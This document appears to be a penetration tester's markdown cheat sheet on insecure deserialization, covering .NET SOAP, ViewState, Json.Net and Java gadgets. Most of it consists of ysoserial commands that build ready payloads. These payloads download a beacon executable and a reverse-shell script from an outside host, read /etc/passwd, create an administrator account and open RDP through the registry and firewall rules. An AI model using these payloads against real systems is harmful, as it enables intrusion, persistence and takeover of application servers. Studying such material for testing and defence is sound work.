#  Insecure deserialization Vulnerability

Any Insecure deserialization vulnerability may occur when serialized object are allowed to alter.as a result, an unauthorized remote user could be able to execute 
arbitrary command and gaining unauthorized access to in the context of applicaiton server.Serialized objects are generally sent across is base64 format used in web applications.technically Serialization refers to a process of turning into  an object into a format on the other hand, deserialization, turning back to serialized data.

# SOAP NET Deserialization
```
ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c "cmd /c ipconfig" -o raw
ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c "cmd /c hostname" -o raw
ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c "cmd /c certutil.exe -urlcache -split -f  http://192.168.100.199\beacon.exe C:\\Users\\Public\\beacon.txe" -o raw
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f"

ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
"
```
# Deserialization 
```

java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget sdfsfdoztjxibkocen698fskck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-0.0.5-all.jar CommonsCollections1 'wget http://192.168.100.199:1010/reverse-shell.pl -O /tmp/shell.pl' > perl-reverse-shell.pl.bin
java -jar ysoserial-0.0.5-all.jar CommonsCollections1 'cat /etc/passwd' > passwd.bin
```
# ViewState Deserialization 

view state is the technique used by an ASP.NET Web page to persist changes to the state of a Web Form across postbacks. By default.
technically ViewState is used to store user data on page at the time of post back of web page however ViewState does not hold the controls,it holds the values of controls.
When tthe page is accessed, the current state of the page and values that need to be retained during postback are serialized into base64-encoded strings and output in the ViewState hidden field or fields.

**It might be possible to execute arbitrary OS Command In the context of applicaiton server if MAC doesn't enforce to enable in the viewstate parameter.**

* Base64 **Can be defined using EnableViewStateMac and ViewStateEncryptionMode attribute set to false**
* Base64 + MAC (Message Authentication Code) **Enabled Can be defined using EnableViewStateMac attribute set to true**
* Base64 + Encrypted **Can be defined using viewStateEncryptionMode attribute set to true**
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c certutil.exe -urlcache -split -f  http://192.168.100.199\beacon.exe C:\\Users\\Public\\beacon.exe"
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f"

ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c netsh advfirewall firewall set rule group="remote desktop" new enable=Yes"
```
# Json Deserialization
```
ysoserial.exe -g WindowsIdentity -f Json.Net -c "ping 192.168.100.100" -o base64
ysoserial.exe -g WindowsIdentity -f Json.Net -c "cmd /c net user MeMe 123456!@ /add " -o base64
ysoserial.exe -g WindowsIdentity -f Json.Net -c "net localgroup administrators MeMe /add" -o base64
ysoserial.exe -g WindowsIdentity -f Json.Net -c "cmd /c netsh advfirewall firewall set rule group="remote desktop" new enable=Yes" -o base64
ysoserial.exe -g WindowsIdentity -f Json.Net -c "cmd /c reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f" -o base64

```
